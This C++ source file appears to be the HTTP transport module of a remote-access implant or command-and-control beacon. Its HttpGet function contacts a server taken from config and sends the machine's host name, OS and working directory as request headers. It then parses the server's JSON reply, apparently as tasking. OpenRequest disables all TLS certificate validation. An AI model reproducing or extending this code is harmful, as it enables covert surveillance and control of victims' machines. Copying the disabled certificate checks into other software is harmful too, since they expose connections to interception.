#include <optional>
#include <nlohmann/json.hpp>

#include "API.h"
#include "Instance.h"
#include "Tansportion.h"

struct _HINTERNET
{
    HINTERNET hSession;
    HINTERNET hConnect;
    HINTERNET hRequest;
};

/// @brief 
/// @param method 
/// @param uri 
/// @return 
_HINTERNET OpenRequest(const std::wstring& method, const std::wstring& uri)
{
    HINTERNET hSession = Win32::WinHttpOpen(
        Instance.Config.userAgent.c_str(),
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession)
        return {NULL, NULL, NULL};

    HINTERNET hConnect = Win32::WinHttpConnect(
        hSession,
        Instance.Config.Address.server.c_str(),
        Instance.Config.Address.port,
        0
    );
    if (!hConnect)
    {
        Win32::WinHttpCloseHandle(hSession);
        return {NULL, NULL, NULL};
    }

    HINTERNET hRequest = Win32::WinHttpOpenRequest(
        hConnect,
        L"GET",
        uri.c_str(),
        NULL,
        NULL,
        NULL,
        WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE
    );
    if (!hRequest)
    {
        Win32::WinHttpCloseHandle(hConnect);
        Win32::WinHttpCloseHandle(hSession);
        return {NULL, NULL, NULL};
    }
    
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID    |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID      |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (!Win32::WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
    {
        Win32::WinHttpCloseHandle(hRequest);
        Win32::WinHttpCloseHandle(hConnect);
        Win32::WinHttpCloseHandle(hSession);
        return {NULL, NULL, NULL};
    }    
    return {hSession, hConnect, hRequest};
}

void CloseAll(_HINTERNET* HinternetList)
{
    Win32::WinHttpCloseHandle(HinternetList->hRequest);
    Win32::WinHttpCloseHandle(HinternetList->hConnect);
    Win32::WinHttpCloseHandle(HinternetList->hSession);
}

namespace spear
{
    // ? I don't know if using so many return is a good idea.
    /// @brief 
    /// @param uri 
    /// @return 
    nlohmann::json HttpGet(const std::wstring& uri)
    {
        DWORD blockSize;
        DWORD readSize;
        nlohmann::json respone;
        _HINTERNET HinternetList = OpenRequest(L"GET", uri);
        if (!HinternetList.hRequest)
            return {};

        Win32::WinHttpAddRequestHeaders(
            HinternetList.hRequest,
            Instance.Info.hostName.insert(0, L"host: ").c_str(),
            -1L,
            WINHTTP_ADDREQ_FLAG_ADD
        );
        Win32::WinHttpAddRequestHeaders(
            HinternetList.hRequest,
            Instance.Info.os.insert(0, L"os: ").c_str(),
            -1L,
            WINHTTP_ADDREQ_FLAG_ADD
        );
        Win32::WinHttpAddRequestHeaders(
            HinternetList.hRequest,
            Instance.Info.cwd.insert(0, L"cwd: ").c_str(),
            -1L,
            WINHTTP_ADDREQ_FLAG_ADD
        );

        if (!Win32::WinHttpSendRequest(
            HinternetList.hRequest,
            NULL, 0, NULL, 0, 0, 0
        ))
        {
            CloseAll(&HinternetList);
            return {};
        }

        if (!Win32::WinHttpReceiveResponse(HinternetList.hRequest, NULL))
        {
            CloseAll(&HinternetList);
            return {};
        }

        if (!Win32::WinHttpQueryDataAvailable(HinternetList.hRequest, &blockSize))
        {
            CloseAll(&HinternetList);
            return {};
        }

        LPVOID buffer = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, blockSize);
        if (!Win32::WinHttpReadData(
            HinternetList.hRequest,
            buffer,
            blockSize,
            &readSize
        ))
        {
            CloseAll(&HinternetList);
            return {};
        }
        respone = nlohmann::json::parse((const char*)buffer);
        LocalFree(buffer);
        CloseAll(&HinternetList);
        return respone;
    }

    /// @brief 
    /// @param uri 
    /// @param data 
    /// @return 
    bool HttpPost(const std::wstring& uri, const nlohmann::json& data)
    {
        return true;
    }
}